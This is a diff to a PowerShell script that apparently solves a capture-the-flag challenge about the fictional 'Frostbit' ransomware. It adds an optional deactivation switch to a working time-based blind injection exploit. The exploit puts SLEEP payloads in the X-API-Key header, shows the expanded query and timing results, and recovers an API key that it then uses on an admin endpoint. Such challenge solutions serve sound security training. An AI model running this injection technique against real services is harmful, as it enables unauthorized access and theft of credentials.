@@ -32,6 +32,13 @@
         FALSE response time  137 ms : X-API-Key: ' OR  "_ke" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         TRUE  response time 2120 ms : X-API-Key: ' OR  "_id" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         FALSE response time  267 ms : X-API-Key: ' OR   "_i" IN ATTRIBUTES(doc) ? SLEEP(2) : '
+        
+        Based on the sql error from the api, these expand out to:
+        FOR doc IN config
+            FILTER doc.<key_name_omitted> == '' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : ''
+            <other_query_lines_omitted>
+            RETURN doc
+
 
     .PARAMETER BotUUID
 
@@ -50,6 +57,10 @@
         or there are time-outs or other errors try increasing this closer to 2.0, or, just don't
         supply this parameter at all.
 
+    .PARAMETER Deactivate
+        
+        Optional Use the found X-API-Key to automatically deactivate the Frostbit ransomware data publication.
+
     .PARAMETER SaveTranscript
 
         Optional Save a powershell transcript log in the default location.
@@ -57,6 +68,10 @@
     .EXAMPLE
 
         .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c
+
+    .EXAMPLE
+
+        .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c -Deactivate
 
         
     .EXAMPLE
@@ -80,6 +95,9 @@ param(
 
     [Parameter(Mandatory=$false)]
     [float]$SQLSleepTimeSeconds,
+
+    [Parameter(Mandatory=$false)]
+    [switch]$Deactivate,
 
     [Parameter(Mandatory=$false)]
     [switch]$SaveTranscript
@@ -136,7 +154,7 @@ $sleeperrormargin = $sleepytimems * 0.98
 
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+$session.UserAgent = "Mozilla/5.0"
 
 $len = 0
 
@@ -305,20 +323,21 @@ foreach($pos in 0..$len){
 }
 "Found: " + $value
 
-$apikey = $value
-"`nAttempting to deactivate the ransomware infrastructure from publishing our data:"
-"Setting HTTP header X-API-Key: $apikey"
-"Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true"
-$resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
--WebSession $session `
--SkipHttpErrorCheck `
--Headers @{
-"X-API-Key"="$apikey"
-})
-($resp.Content | ConvertFrom-Json).message
-
-$swtotal.Stop()
-"`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
-"Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
-
+if($Deactivate){
+    $apikey = $value
+    "`nAttempting to deactivate the ransomware infrastructure from publishing our data:"
+    "Setting HTTP header X-API-Key: $apikey"
+    "Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true"
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    -WebSession $session `
+    -SkipHttpErrorCheck `
+    -Headers @{
+    "X-API-Key"="$apikey"
+    })
+    ($resp.Content | ConvertFrom-Json).message
+    
+    $swtotal.Stop()
+    "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
+    "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
+}
 if($SaveTranscript){Stop-Transcript}
